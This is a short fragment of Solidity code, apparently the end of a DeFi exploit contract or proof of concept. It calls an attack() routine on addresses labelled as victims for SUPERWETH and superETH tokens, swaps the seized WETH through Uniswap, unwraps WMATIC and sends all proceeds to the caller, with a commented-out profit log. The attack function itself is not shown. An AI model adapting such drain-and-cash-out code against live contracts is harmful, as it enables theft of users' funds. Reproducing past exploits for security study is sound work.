        attack(victims_superweth, 0, address(SUPERWETH));
        uint256 _wethBalance = WETH.balanceOf(address(this));
        uniswapSwapV3ToWETH(_wethBalance, WETH);
        
        IWMATIC(address(WMATIC)).withdraw(IWMATIC(address(WMATIC)).balanceOf(address(this)));

        attack(victims_eth, 1, address(supereth));
        
        payable(tx.origin).transfer(address(this).balance);
        // eth, matic check 
        // emit log_named_uint("Profit: ",address(tx.origin).balance - _base);
    }
    receive() external payable {} 
}
